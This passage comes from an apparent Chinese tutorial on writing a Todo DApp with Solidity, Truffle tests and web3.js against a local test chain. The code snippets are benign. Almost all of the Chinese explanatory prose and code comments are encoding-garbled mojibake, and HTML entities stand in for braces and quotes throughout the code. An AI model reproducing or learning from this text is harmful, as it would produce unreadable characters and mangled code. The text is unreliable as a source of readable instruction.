ä¸­ç›¡å¯èƒ½çš„å°‡ç›¸åŒçš„è³‡æ–™å‹åˆ¥æ’åˆ—åœ¨ä¸€èµ·ï¼Œä¹Ÿå¯ä»¥ç¯€çœå„²å­˜çš„è³‡æ–™é‡ã€‚
é™¤äº† Array ä¹‹å¤–ï¼ŒSolidity ä¸­å¸¸ç”¨çš„é‚„æœ‰ mappingï¼Œä»£è¡¨ key-value ä¹‹é–“çš„å°æ‡‰ã€‚ä¾‹å¦‚
// ç”± id(int) å°æ‡‰åˆ° todo(Todo)mapping(int =&gt; Todo) idMapTodo;

Step2. åŠ ä¸Šæ“ä½œè³‡æ–™çš„ Function(Method)contract TodoFactory &#123;  function addTodo(string _taskName) public &#123;    Todo memory todo = Todo(_taskName, false, true);    uint todoId = todos.push(todo) - 1;  &#125;&#125;
åœ¨ addTodo ä¸­ï¼Œæˆ‘å€‘å…ˆä»¥è¼¸å…¥çš„ _taskName åˆå§‹åŒ–ä¸€å€‹å‹æ…‹æ˜¯ Todo çš„ç‰©ä»¶ï¼Œæ¥è‘—åŠ é€²åˆç´„ä¸­çš„ todos é™£åˆ—ï¼Œä¸¦ä»¥é™£åˆ—ç´¢å¼•ç•¶ä½œ idã€‚æ³¨æ„åˆ°ä¸Šé¢çš„å‡½å¼å³ä½¿åŠ ä¸Šå›å‚³å€¼ä¹Ÿç„¡æ³•å›å‚³é æœŸçš„çµæœï¼Œä¹‹å¾Œæœƒå†è§£é‡‹é€™éƒ¨ä»½ã€‚
Solidity ä¸­ contract å’Œ function çš„é—œä¿‚ï¼Œå¯ä»¥é¡æ¯”æˆ class å’Œ function çš„é—œä¿‚ï¼Œcontract ä¹Ÿæ˜¯å¯ä»¥è¢«ç¹¼æ‰¿çš„ï¼Œè€Œ function å¯ä»¥åŠ ä¸Šä¸€äº› modifierï¼Œä¾‹å¦‚ï¼š

public: ä»£è¡¨å¯ä»¥è¢«å¤–ç•Œèª¿ç”¨
private: ä»£è¡¨åªèƒ½è¢«æ­¤åˆç´„ä¸­çš„å…¶ä»– function èª¿ç”¨
internal: ä»£è¡¨å¯ä»¥è¢«æ­¤åˆç´„å’Œç¹¼æ‰¿çš„åˆç´„èª¿ç”¨ï¼Œåƒæ˜¯ c++ çš„ protected
external: ä»£è¡¨åªèƒ½è¢«å¤–ç•Œèª¿ç”¨æˆ–æ˜¯
view: ä»£è¡¨æ­¤ function ä¸æœƒå°å€å¡Šéˆä¸Šçš„è³‡æ–™ä½œä»»ä½•çš„æ›´æ”¹ï¼Œåƒæ˜¯ get function
pure: ä»£è¡¨æ­¤ function ä¸æœƒæ“ä½œåˆ°å€å¡Šéˆä¸Šçš„ä»»ä½•è³‡æ–™ï¼Œæ‰€ä»¥ pure function ä¸æœƒæ¶ˆè€—ä»»ä½•çš„ gasï¼Œå¯ä»¥æƒ³åƒé€™å°±æ˜¯ util function

å¦å¤–éœ€è¦ç‰¹åˆ¥æ³¨æ„çš„æ˜¯ï¼ŒSolidity ä¸­åŸ·è¡Œå‡½å¼çš„æ–¹å¼è¢«åˆ†æˆ Call å’Œ Transaction å…©ç¨®ï¼ˆé›–ç„¶ç¨‹å¼ç¢¼éƒ½æ˜¯ functionï¼‰

Call: ä»£è¡¨åŸ·è¡Œå‡½å¼ä½†æ˜¯ä¸æœƒå°å€å¡Šéˆä½œä»»ä½•çš„ä¿®æ”¹ï¼Œå¯ä»¥ä½¿ç”¨ã€Œå›å‚³å€¼ã€ï¼Œé€šå¸¸æœƒè¢«é€™æ¨£ä½¿ç”¨çš„å‡½å¼åŒ…å« view æˆ–æ˜¯ pure é€™å…©å€‹é—œéµå­—ï¼Œå¦‚æœå°æ–¼ä¸€å€‹æœ‰å¯«å…¥çš„å‡½å¼ä½¿ç”¨ call çš„æ–¹å¼åŸ·è¡Œï¼Œçµæœä¸æœƒå¯«å…¥ä»»ä½•çš„è³‡æ–™
Transaction: å’Œ Call ç›¸åï¼Œåœ¨åŸ·è¡Œä¸Šæœƒå¯«å…¥è³‡æ–™ï¼Œå› æ­¤éœ€è¦ç­‰å¾…ç¤¦å·¥å€‘å°‡è³‡æ–™å¯«å…¥ï¼Œæ‰€ä»¥å‡½å¼çš„ã€Œå›å‚³å€¼ã€åƒ…ä»£è¡¨ transaction hashï¼Œä¸æœƒå›å‚³é æœŸçš„çµæœã€‚

ä»¥ä¸Šå¯ä»¥åƒè€ƒé€™å€‹è¨è«–ä¸²
é™¤äº†é è¨­çš„é—œéµå­—ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨é—œéµå­— modifier å®£å‘Šè‡ªè¨‚çš„ modifierï¼Œé¡ä¼¼ python æˆ–æ˜¯ js ES7 ä¸­çš„ decoratorï¼ˆè£é£¾å­—ï¼‰ï¼Œä¾‹å¦‚
contract TodoFactory &#123;  modifier isValidTodo(uint _todoId) &#123;    // require è¦æ±‚å‚³å…¥çš„åƒæ•¸è¦æ˜¯ trueï¼Œå¦å‰‡ä¸­æ­¢æ“ä½œï¼Œä¸¦é€€é‚„åŸ·è¡Œæ™‚æ¶ˆè€—çš„ gas    // ä»¥ä¸‹é€£çµæœ‰æ›´è©³ç´°çš„æ¯”è¼ƒå’Œèªªæ˜    // https://medium.com/taipei-ethereum-meetup/æ¯”è¼ƒ-require-assert-å’Œ-revert-åŠå…¶é‹ä½œæ–¹å¼-30c24d534ce4    require(isTodoValid(_todoId));    _; // é€™æ˜¯èªæ³•ä¸Šå¿…è¦çš„  &#125;  function deleteTodo(uint _todoId) public isValidTodo(_todoId) &#123;    todos[_todoId].isValid = false;  &#125;&#125;
åœ¨ä¸Šè¿°çš„ç¨‹å¼ç¢¼ä¸­ï¼Œé¦–å…ˆåˆ©ç”¨è‡ªè¨‚çš„ modifier æª¢æŸ¥æƒ³è¦åˆªé™¤çš„å…ƒç´ æ˜¯å¦æœ‰æ•ˆï¼Œæœ‰æ•ˆæ‰æœƒåˆªé™¤ã€‚å›åˆ°å‰é¢æ–°å¢ç‰©ä»¶çš„éƒ¨åˆ†ï¼ŒæŠŠé™£åˆ—ç´¢å¼•ç•¶ä½œ id æ˜¯å¾ˆå¥‡æ€ªçš„ä½œæ³•ï¼Œå› ç‚ºå¯¦ä½œä¸Šå¦‚æœæŠŠé™£åˆ—çš„å…ƒç´ ç§»é™¤ï¼Œå¯èƒ½æœƒæƒ³ç”¨å…¶ä»–çš„å…ƒç´ å¡«è£œé€™å€‹ç©ºéš™ï¼Œä»¥ç¯€çœå„²å­˜ç©ºé–“ï¼Œé€™æ¨£ç´¢å¼•å°±æœƒè¢«æ›´æ”¹ï¼Œä¾‹å¦‚ [a, b, c] ç§»é™¤ b å¾Œæœƒè®Šæˆ [a, c]ï¼Œä½†æ˜¯å› ç‚ºå€å¡Šéˆçš„å¯«å…¥æˆæœ¬æ¥µé«˜ï¼Œå› æ­¤ç•¶åˆªé™¤é™£åˆ—å…ƒç´ æ™‚ï¼Œä¸æ‡‰è©²æ¬ç§»å…¶ä»–çš„å…ƒç´ ï¼Œæ‰€ä»¥ç›´æ¥å°‡é€™å€‹å…ƒç´ è¨­å®šæˆ invalid æ˜¯æˆæœ¬è¼ƒä½çš„ä½œæ³•ï¼Œç•¶ç„¶ä¹Ÿå¯ä»¥ç”¨ delete åˆªé™¤ï¼Œä½†æ˜¯æœƒé€ æˆç©ºéš™ã€‚
å¦å¤– Solidity ä¸­çš„å‡½å¼å¯ä»¥å›å‚³è¤‡æ•¸çš„å€¼ï¼Œå›å‚³æ™‚é¡ä¼¼ tuple ä»¥()åŒ…è£¹ï¼Œä¸éå›å‚³çš„è³‡æ–™å‹åˆ¥åªèƒ½æ˜¯åŸå§‹çš„è³‡æ–™å‹åˆ¥æˆ–æ˜¯é™£åˆ—ï¼Œä¹Ÿå°±æ˜¯èªªä¸èƒ½å›å‚³ struct æˆ–è€…æ˜¯ string[]ã€‚
Step3. åŠ ä¸Š event æ¨™ç¤ºå·²å®Œæˆçš„äº‹ä»¶å¦‚åŒå‰é¢æåˆ°çš„ï¼ŒåŸ·è¡Œ addTodo, deleteTodo, completeTodo çš„æ™‚å€™éƒ½æœƒä»¥ Transaction çš„æ–¹å¼åŸ·è¡Œï¼ˆä¸ç„¶ä¸æœƒå¯«å…¥è³‡æ–™ï¼‰ï¼Œå› æ­¤ç‚ºäº†è®“å…¶ä»–äººçŸ¥é“åŸ·è¡Œå®Œç•¢ï¼Œä¸¦æ”¶åˆ°åŸ·è¡Œçš„çµæœï¼Œå¿…é ˆä½¿ç”¨ event è§¸ç™¼çš„æ–¹å¼ã€‚
contract TodoFactory &#123;event OnTodoAdded(uint todoId);  function addTodo(string _taskName) public &#123;    Todo memory todo = Todo(_taskName, false, true);    uint todoId = todos.push(todo) - 1;        // trigger event:    // é€™æ¨£æ‰èƒ½å–å¾—åŸä¾†çš„å›å‚³å€¼ todoId    // åœ¨ v0.4.21 ä¹‹å¾Œï¼Œå¿…é ˆå¯«æˆ emit OnTodoAdded(todoId)    OnTodoAdded(todoId);  &#125;&#125;
event çš„å®£å‘Šå°±åƒæ˜¯å‡½å¼çš„ headerï¼Œåˆ©ç”¨ event å¯ä»¥è®“å¤šå€‹ client ç›£è½æ™ºæ…§åˆç´„çš„è®ŠåŒ–ï¼Œè€Œä¸”é€™äº› event ä¸€æ—¦è¢«è§¸ç™¼å°±æœƒè¢«ç´€éŒ„åœ¨å€å¡Šéˆè£¡é¢ï¼Œæœªä¾†å¯ä»¥å¾ˆè¼•æ˜“çš„æŸ¥è©¢éå»ç™¼ç”Ÿéçš„ç´€éŒ„ 
Step4. ç·¨è­¯åŠä½ˆç½²åˆç´„åŸå‰‡ä¸Šå°±æ˜¯ç…§æŠ„ migrations/1_initial_migration.js
// migrations/4_deploy_todoFactory.jsconst TodoFactory = artifacts.require(&#x27;TodoFactory&#x27;);module.exports = function (deployer) &#123;  deployer.deploy(TodoFactory);&#125;

æ¥è‘—ä¾åºç·¨è­¯å’Œä½ˆç½²åˆç´„åˆ°è‡ªå»ºçš„æ¸¬è©¦å€å¡Šéˆä¸Š
truffle compile
åŸ·è¡Œçµæœæœƒ åœ¨ build/ å»ºç«‹ TodoFactory.json
truffle migrate## åŸ·è¡Œçµæœ# Running migration: 4_deploy_todoFactory.js#   Deploying TodoFactory...#   ... 0xfecf0206d68c496cf067e320a4d4b5d294dfe89979552f7b6b8ab38696c51356#   TodoFactory: 0x21e4624c5a0b3fda81d0833d412dded2bb3a7a7c# Saving successful migration to network...#   ... 0x6f592087ebfa7d5d77cce3f82c9d1222148c25499c348a59480ccfb3fe5884e1# Saving artifacts...

å…¶ä¸­ 0x21e4624c5a0b3fda81d0833d412dded2bb3a7a7c å°±æ˜¯åˆç´„éƒ¨ç½²åœ¨å€å¡Šéˆä¸Šçš„ä½å€
Step5. æ¸¬è©¦ç”±æ–¼å·²ç¶“ä½ˆç½²åœ¨å€å¡Šéˆä¸Šçš„åˆç´„ç„¡æ³•å†è¢«ä¿®æ”¹ï¼Œæœ€å¤šåªèƒ½åˆ©ç”¨äº‹å…ˆè¨­å®šçš„å‡½æ•¸èª¿æ•´åƒæ•¸ï¼Œå› æ­¤æ¯ä¸€æ¬¡çš„åˆç´„æ›´æ–°éƒ½æœƒå°è‡´åœ°å€çš„æ”¹è®Šï¼Œåœ¨å¯¦éš›çš„æ‡‰ç”¨ä¸Šä»£è¡¨è‘—æ¯æ¬¡åˆç´„çš„æ›´æ–°éƒ½éœ€è¦æ”¹è®Šåˆ©ç”¨åˆ°çš„åˆç´„ä½å€ï¼Œé€™æ˜¯éå¸¸éº»ç…©çš„äº‹æƒ…ï¼Œå› æ­¤ä½ˆç½²å‰çš„æ¸¬è©¦ç›¸ç•¶é‡è¦ï¼Œå¦å¤–æ¸¬è©¦å°æ–¼ TDDï¼ˆTest Drive Developmentï¼‰ æˆ–æ˜¯ CI,CD çš„æµç¨‹ä¹Ÿæ˜¯ä¸å¯æˆ–ç¼ºçš„ã€‚truffle å…§å»ºæ¸¬è©¦ç”¨çš„æ¡†æ¶ï¼Œåˆ©ç”¨ Mocha å’Œ Chai é€™å…©å€‹åœ¨ javascript ä¸­å¸¸ç”¨çš„å¥—ä»¶ï¼ˆå…©è€…æ‰€ä½¿ç”¨çš„ç‰ˆæœ¬å¯ä»¥å¾ ganache-core æŸ¥çœ‹ï¼‰
ä»¥ä¸‹çš„æ¸¬è©¦å¯ä»¥é©—è­‰åˆç´„æ˜¯å¦æ­£å¸¸ç™¼ä½ˆ
// test/test_todoFactory.jsconst TodoFactory = artifacts.require(&#x27;TodoFactory&#x27;);contract(&#x27;TodoFactory&#x27;, function(accounts) &#123;  before(async () =&gt; &#123;    // åœ¨æ‰€æœ‰æ¸¬è©¦é–‹å§‹å‰ä½ˆç½²åˆç´„    contract = await TodoFactory.deployed();  &#125;);  it(&#x27;Should contract deployed properly&#x27;, () =&gt; &#123;    // é©—è­‰åˆç´„æ˜¯å¦å·²ç¶“è¢«ä½ˆç½²    assert.isDefined(contract);  &#125;);&#125;
å°æ–¼éåŒæ­¥çš„æƒ…å½¢è€Œè¨€ï¼Œå¯ä»¥ä½¿ç”¨ Promise æˆ–è€…æ˜¯ Callback çš„èªæ³•ï¼Œé€™è£¡ç”¨ Promise é…åˆ async-await æ¯”è¼ƒç°¡æ½”ã€‚ä¸éå› ç‚ºç›®å‰ ganache-core æ‰€ä½¿ç”¨çš„ chai ç‰ˆæœ¬ç‚º 3.5ï¼Œç„¡æ³•æŠ“åˆ°éåŒæ­¥çš„éŒ¯èª¤ï¼Œå› æ­¤å¦‚æœéœ€è¦é€™æ–¹é¢çš„æ¸¬è©¦å¯ä»¥ç”¨ä»¥ä¸‹çš„å¯«æ³•
contract(&#x27;TodoFactory&#x27;, function(accounts) &#123;  it(&#x27;Should not complete invalid task&#x27;, async () =&gt; &#123;    contract.completeTodo(9527, (err) =&gt; &#123;      assert.isDefined(err);    &#125;)  &#125;);&#125;

å¦å¤–åœ¨æ¸¬è©¦çš„éƒ¨åˆ† truffle å°æ–¼ Call å’Œ Transaction å…©ç¨®åŸ·è¡Œæ–¹å¼ä¸¦æ²’æœ‰å€åˆ†ï¼Œéƒ½æ˜¯ç”¨ä¸€èˆ¬å‡½å¼çš„å‘¼å«æ–¹å¼ï¼Œå·®åˆ¥åœ¨å¾Œè€…å›å‚³çš„æ˜¯ transaction hashï¼Œå¾ hash å¯ä»¥å–å¾—è§¸ç™¼çš„ event çš„è³‡è¨Š
// test/utils.jsfunction getEvents (tx, filter) &#123;  const logs = tx.logs;  const events = _.filter(logs, filter);  return events;&#125;// test/test_todoFactory.jscontract(&#x27;TodoFactory&#x27;, function(accounts) &#123;  it(&#x27;Should add new todo properly&#x27;, async () =&gt; &#123;    // addTodo çš„å‘¼å«æ˜¯ Transaction æ‰€ä»¥å³ä½¿ addTodo ä¸­æœ‰å›å‚³å€¼ï¼Œä¹Ÿç„¡æ³•æ”¶åˆ°    const tx1 = await contract.addTodo(Todo1.taskName);    const events1 = utils.getEvents(tx1, &#123; event: &#x27;OnTodoAdded&#x27;, logIndex: 0 &#125;);    todoId1 = events1[0].args.todoId;  &#125;);&#125;

å¦å¤–å¦‚æœè¦æª¢æŸ¥åŸ·è¡Œæ™‚è§¸ç™¼çš„ event å¯ä»¥åƒè€ƒ stackoverflow ä¸Šçš„è¨è«–ä¾†é©—è­‰
// test/utils.jsfunction assertEvent(contract, filter) &#123;  return new Promise((resolve, reject) =&gt; &#123;    const event = contract[filter.event]();    // event.watch, event.get, event.stopWatching    // åœ¨ web3 ä¸­ä¹Ÿæœ‰å°æ‡‰çš„ function ä¾†ç›£è½å€å¡Šéˆä¸Šçš„äº‹ä»¶    event.watch();    event.get((error, logs) =&gt; &#123;      const log = _.filter(logs, filter);      if (!_.isEmpty(log)) &#123;        resolve(log);      &#125; else &#123;        reject(new Error(&quot;Failed to find filtered event for &quot; + filter.event));      &#125;    &#125;);    event.stopWatching();  &#125;);&#125;,// test/test_todoFactory.jscontract(&#x27;TodoFactory&#x27;, function(accounts) &#123;  it(&#x27;Should delete todo properly&#x27;, async () =&gt; &#123;    await contract.deleteTodo(todoId1);    await utils.assertEvent(contract, &#123; event: &#x27;OnTodoDeleted&#x27;, args: &#123; todoId: todoId1 &#125; &#125;);  &#125;);&#125;
æ¥è‘—åŸ·è¡Œä»¥ä¸‹æŒ‡ä»¤å¾Œå¯ä»¥å¾—åˆ°æ¸¬è©¦çš„çµæœ
truffle test

è¬›å®Œ DAppã€Œå¾Œç«¯ã€çš„éƒ¨åˆ†å¾Œï¼Œæ¥ä¸‹ä¾†æ˜¯åˆ©ç”¨å‰ç«¯ä¾†å’Œæ™ºæ…§åˆç´„äº’å‹•
Web3.jsWeb3.js æä¾› javascript ç”¨ä¾†å’Œä»¥å¤ªåŠäº’å‹•çš„ APIï¼Œé€™é‚Šä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯ v1.0ï¼Œv1.0 èˆ‡ä¹‹å‰çš„ç‰ˆæœ¬æœ‰ç›¸ç•¶å¤§çš„å·®åˆ¥ï¼Œé™¤äº†é¡å¤–æä¾› Socket æ¥å£ç›£è½äº‹ä»¶ï¼ŒAPI çš„å‘¼å«æ–¹å¼ä¹Ÿå®Œå…¨ä¸åŒï¼Œç”šè‡³æœ‰äº›é€£é‹ä½œçš„é‚è¼¯ä¹Ÿä¸åŒï¼Œæ‰€ä»¥åœ¨æŸ¥è©¢è³‡æ–™ä¸Šéœ€è¦ç‰¹åˆ¥æ³¨æ„é€™é»ã€‚å‰ç«¯çš„åŠŸèƒ½é™¤äº†å‚³çµ± Todo App çš„æ–°å¢ã€åˆªé™¤ã€æ¨™è¨˜å®Œæˆä»»å‹™çš„åŠŸèƒ½ä¹‹å¤–ï¼Œé‚„å¯ä»¥åˆ—å‡ºé€™å€‹ DAPP éå»çš„æ“ä½œç´€éŒ„ã€‚ä½†é€™é‚Šåªæœƒå¼·èª¿èˆ‡ web3 ç›¸é—œçš„æ¥å£éƒ¨åˆ†ï¼Œå…¶é¤˜çš„éƒ¨åˆ†è«‹çœ‹å®Œæ•´çš„ç¨‹å¼ç¢¼ï¼Œé‹ä½œæµç¨‹å¦‚ä¸‹ï¼š


Step1. å®‰è£ web3npm install web3

Step2. åˆå§‹åŒ– web3// ethereum-todo/src/config/config-web3.js// ä½¿ç”¨ websocket// localhost:8545 æ˜¯åˆ©ç”¨ truffle å»ºç«‹çš„æ¸¬è©¦ç”¨å€å¡Šéˆ// const web3 = new Web3(new Web3.providers.WebsocketProvider(&#x27;ws://localhost:8545&#x27;)) const web3 = new Web3(&#x27;ws://localhost:8545&#x27;);// or ä½¿ç”¨ http// const web3 = new Web3(new Web3.providers.HttpProvider(&#x27;ws://localhost:8545&#x27;)) // const web3 = new Web3(&#x27;http://localhost:8545&#x27;);
é™¤äº†è‡ªå·±æ¶è¨­æ¸¬è©¦çš„å€å¡Šéˆå¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¬é–‹çš„æ¸¬è©¦å€å¡Šéˆã€‚
Step3. åˆå§‹åŒ–åˆç´„é€™é‚Šéœ€è¦ç”¨åˆ°åˆç´„çš„ ABIï¼ˆApplication Binary Interfaceï¼‰ ä»¥åŠåœ¨å€å¡Šéˆä¸Šä½ˆç½²çš„ä½å€ï¼ŒABI å°±æ˜¯ç´€éŒ„åˆç´„ä¸­ä½¿ç”¨åˆ°çš„å‡½æ•¸å’Œè®Šæ•¸çš„æ–‡ä»¶ï¼Œé€™è£¡æœ‰æ›´è©³ç´°çš„èªªæ˜ï¼Œé¦–å…ˆå…ˆå°‡å‰ä¸€å€‹éƒ¨åˆ†ç·¨è­¯å¾Œçš„æª”æ¡ˆï¼ˆbuild/contracts/TodoFactory.jsonï¼‰è¤‡è£½åˆ°å°ˆæ¡ˆè³‡æ–™å¤¾
// ethereum-todo/src/contracts/todoContractimport web3 from &#x27;config/config-web3&#x27;;import TodoFactoryJSON from &#x27;./TodoFactory.json&#x27;;const CONTRACT_ADDRESS = &#x27;0x21e4624c5a0b3fda81d0833d412dded2bb3a7a7c&#x27;;const todoContract = new web3.eth.Contract(TodoFactoryJSON.abi, CONTRACT_ADDRESS);export default todoContract;
é€™æ¨£å°±å»ºç«‹ä¸€å€‹åˆç´„çš„å¯¦é«”å¯ä¾›æ“ä½œ
Step4. åŸ·è¡Œåˆç´„é‡è¤‡å‰é¢æåˆ°çš„ï¼ŒTransaction åˆç´„çš„åŸ·è¡Œéœ€è¦æ¶ˆè€— gasï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦æœ‰ä¸€å€‹å¸³è™Ÿä¾†èŠ±è²» gas åŸ·è¡Œé€™äº›åˆç´„ï¼Œå¯ä»¥å¾ truffle å»ºç«‹çš„å€å¡Šéˆä¸­æ‰¾åˆ°æ¸¬è©¦ç”¨çš„å¸³è™Ÿï¼ˆä¹Ÿå°±æ˜¯åŸ·è¡Œæ™‚å»ºç«‹çš„é‚£åå€‹ï¼‰ï¼Œä¸¦è—‰è‘— web3 æä¾›çš„ api æŸ¥çœ‹å¸³è™Ÿæ“æœ‰çš„ gasï¼š
// ethereum-todo/src/helpers/accountsHelper/balance.jsimport web3 from &#x27;config/config-web3&#x27;;export async function getBalanceAsync(address) &#123;  const balance = await web3.eth.getBalance(address);  return balance;&#125;// æ¥è€…å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹ä½¿ç”¨ getBalanceAsync ä¾†å–å¾—ç‰¹å®šä½¿ç”¨è€…ç›®å‰çš„ gas é‡ï¼Œä¾‹å¦‚// const DEFAULT_USER = &#x27;0x1d489c3f8ed5ee71325a847888b2157c9ac29c05&#x27;;//// void async function() &#123;//   const balance = await getBalanceAsync(DEFAULT_USER);//   console.log(&#x27;Balance of account0&#x27;, balance);// &#125;()

åœ¨ web3 ä¸­ Call å’Œ Transaction åˆ†åˆ¥å°æ‡‰ contract.methods.myMethod.call å’Œ contract.methods.myMethod.send å…©ç¨®å‘¼å«æ–¹å¼ï¼Œå¾Œè€…åœ¨ä¹‹å‰çš„ç‰ˆæœ¬æ˜¯ sendTransactionã€‚å…©è€…çš„ä½¿ç”¨å¦‚ä¸‹
// ethereum-todo/src/helpers/todoHelpers/todoAction.jsimport todoContract from &#x27;contracts/todoContract&#x27;;// ç¬¬ä¸€å€‹æ¸¬è©¦å¸³è™Ÿçš„ gas æ•¸ç›®ç›¸ç•¶å¤šï¼Œå¾ˆé©åˆç”¨ä¾†æ¸¬è©¦åˆç´„çš„åŸ·è¡Œconst DEFAULT_USER = &#x27;0x1d489c3f8ed5ee71325a847888b2157c9ac29c05&#x27;;export async function getTodoAsync(todoId) &#123;  // ä¼°è¨ˆéœ€è¦æ¶ˆè€—çš„ gas  const gas = await todoContract.methods.getTodo(todoId).estimateGas();  console.log(&#x27;Get Todo: Estimated gas&#x27;, gas);  // å› ç‚º getTodo ä¸æœƒä¿®æ”¹åˆ°è³‡æ–™ï¼Œæ‰€ä»¥ç”¨ call   const result = await todoContract.methods.getTodo(todoId).call(&#123;    from: DEFAULT_USER,    gas:200000,  &#125;);  return result;&#125;export async function addTodoAsync(taskName) &#123;  // ä¼°è¨ˆéœ€è¦æ¶ˆè€—çš„ gasï¼Œå› ç‚ºå¿…é ˆå¯«å…¥å­—ä¸²ï¼Œæ‰€ä»¥å¾ˆå¯èƒ½æœƒæ¶ˆè€—è¶…éé è¨­å€¼ 90000 çš„ gasï¼Œ  // æ•…èª¿é«˜ gas limit åˆ° 200000  const gas = await todoContract.methods.addTodo(taskName).estimateGas();  console.log(&#x27;AddTodo: Estimated gas&#x27;, gas);  // å› ç‚º addTodo æœƒä¿®æ”¹è³‡æ–™ï¼Œæ‰€ä»¥å¿…é ˆç”¨ send  // å¦‚æœé€™é‚Šæ”¹æˆ callï¼Œä¾ç„¶å¯ä»¥åŸ·è¡Œï¼Œä½†ä¸æœƒæœ‰è³‡æ–™çš„å¯«å…¥  await todoContract.methods.addTodo(taskName).send(&#123;    from: DEFAULT_USER,    gas: 200000,  &#125;);&#125;

ç„¡è«–ç”¨ call æˆ–æ˜¯ send éƒ½å¯ä»¥æŒ‡å®šæ¶ˆè€—çš„ gas æœ€å¤§å€¼ï¼ˆç¨±ç‚º gas limit é€™è£¡æ˜¯ 200000ï¼‰ï¼Œgas limit çš„è¨­è¨ˆæ˜¯ç‚ºäº†é˜²æ­¢æ™ºæ…§åˆç´„åœ¨åŸ·è¡Œæ™‚ç”¢ç”Ÿç„¡çª®è¿´åœˆçš„æƒ…å½¢ï¼Œå› ç‚ºæ‰€æœ‰çš„é‹ç®—éƒ½éœ€è¦æ¶ˆè€— gasï¼Œä¸€æ—¦æ¶ˆè€— gas çš„ç¸½é‡åˆ°é” gas limitï¼Œå°±æœƒçµ‚æ­¢åŸ·è¡Œã€‚
Step5. ç›£è½åŸ·è¡Œçš„çµæœé‚„æ˜¯ä¸€æ¨£ Transaction çš„åŸ·è¡Œéœ€è¦ç­‰åˆ°ç¤¦å·¥å€‘å¯«å…¥è³‡æ–™æ‰ç®—çœŸçš„å®Œæˆï¼Œå› æ­¤åªèƒ½åˆ©ç”¨ç›£è½äº‹ä»¶çš„æ–¹å¼ä¾†ç¢ºå®šã€‚åœ¨é€™å€‹å°ˆæ¡ˆä¸­å°‡é€™äº›ç›£è½çš„è™•ç†æ”¾åœ¨ src/events è³‡æ–™å¤¾ä¸‹ï¼Œæœªä¾†æˆ–è¨±æ”¾åœ¨ middleware æ˜¯æ¯”è¼ƒæ¼‚äº®çš„æ–¹å¼ã€‚
// ethereum-todo/src/events/todoEvents.jsimport todoContract from &#x27;contracts/todoContract&#x27;;import * as todoHelper from &#x27;helpers/todoHelpers&#x27;;import &#123; addTodo, deleteTodo, completeTodo &#125; from &#x27;containers/App/duck/todo&#x27;;import store from &#x27;../store&#x27;;// Event// OnTodoAdded æ˜¯ event çš„åç¨±todoContract.events.OnTodoAdded(&#123;&#125;, async (error, result) =&gt; &#123;  if (error) &#123;    console.log(error);    return;  &#125;  // result  // &#123;  //   raw: &#123;  //     data: &quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;,  //     topics: [&quot;0x6edbfebf4adc3e180444860a21cd838446f00049410a44c6ec4a178a2ebe529b&quot;]  //   &#125;,  //   returnValues: &#123;  //     todoId: 1  //   &#125;,  //   address: &quot;0x21e4624c5A0B3fdA81D0833d412DDED2bb3A7a7C&quot;, // åˆç´„çš„ address  //   blockHash: &quot;0x9186b52740bff34239c92137ae1ecb7205a028b540e30b79256b13b829354252&quot;,  //   blockNumber: 61,  //   event: &quot;OnTodoAdded&quot;,  //   signature: &quot;0x6edbfebf4adc3e180444860a21cd838446f00049410a44c6ec4a178a2ebe529b&quot;,  //   transactionHash: &quot;0x997195a40d9ad102b0c18b730711fec0623596643c5820253296415b816563a3&quot;,  //   transactionIndex: 0,  //   type: &quot;mined&quot;  // &#125;  const &#123; returnValues: &#123; todoId &#125; &#125; = result;  // å› ç‚ºäº‹ä»¶çš„å›å‚³å€¼åªæœ‰ todoIdï¼Œå› æ­¤é‚„éœ€è¦å–å¾—å®Œæ•´çš„ todo è³‡æ–™ã€‚  const todo = await todoHelper.getTodoAsync(todoId);  store.dispatch(addTodo(todoId, todo[0], todo[1]));  console.log(&#x27;Add&#x27;, todoId);&#125;);

Step6. ç²å–éå»çš„äº‹ä»¶å€å¡Šéˆå¯ä»¥è¦–ç‚ºä¸€å€‹ä¿å­˜æ“ä½œç´€éŒ„ä¸¦ä¸”ç¢ºä¿é€™äº›ç´€éŒ„ç„¡æ³•è¢«ç«„æ”¹çš„è³‡æ–™åº«ï¼Œå› æ­¤ä¸Šè¿°çš„æ“ä½œäº‹ä»¶éƒ½æœƒè¢«ç´€éŒ„åœ¨å€å¡Šéˆä¸Šï¼Œweb3 æä¾› getPastEvents é€™å€‹ api ä¾†å–å¾—éå»çš„äº‹ä»¶ï¼ˆweb3 åœ¨ v1.0 ç‰ˆæœ¬å‰è¦å–å¾—éå»çš„äº‹ä»¶éœ€è¦æŒçºŒç›£è½ï¼Œè€Œéç›´æ¥å‚³å›çµæœï¼‰
// ethereum-todo/src/helpers/todoHelpers/eventLogs.jsimport todoContract from &#x27;contracts/todoContract&#x27;;export async function getAllEventsAsync() &#123;  const events = await todoContract.getPastEvents(&#x27;allEvents&#x27;, &#123;    // ä¹Ÿå°±æ˜¯å–å¾—å¾ç¬¬ä¸€å€‹å€å¡Šåˆ°æœ€æ–°å€å¡Šçš„æ‰€æœ‰äº‹ä»¶    fromBlock: 0,    toBlock: &#x27;latest&#x27;  &#125;);  // events æ˜¯ä¸€å€‹é™£åˆ—ï¼Œé™£åˆ—å…ƒç´ èˆ‡å‰è¿°ç›£è½äº‹ä»¶çš„å›å‚³å€¼ç›¸åŒ  return events;&#125;

é€éä»¥ä¸Šçš„å…©å€‹éƒ¨åˆ†å·²ç¶“å¯ä»¥åˆ©ç”¨æ™ºæ…§åˆç´„åœ¨å€å¡Šéˆä¸Šå¯«ä¸€å€‹ Todo DAppï¼Œä¸éä½¿ç”¨çš„æ–¹å¼ä»ç„¶ç›¸ç•¶ä¾·é™ï¼Œä¹Ÿå¿½ç•¥ä¸å°‘å¯¦éš›ä¸Šå¯èƒ½æœƒç¢°åˆ°çš„å•é¡Œï¼Œäº‹å¯¦ä¸Šå…‰æ˜¯å¦‚ä½•é©ç•¶çš„å„²å­˜è³‡æ–™åœ¨å€å¡Šéˆä¸Šå°±æ˜¯ä¸€å¤§æŒ‘æˆ°ï¼Œé€™å€‹å°ˆæ¡ˆå¯ä»¥ç•¶ä½œç°¡å–®åŸºåº•ï¼Œç¹¼çºŒæ·±å…¥ç ”ç©¶ã€‚
åƒè€ƒè³‡æ–™
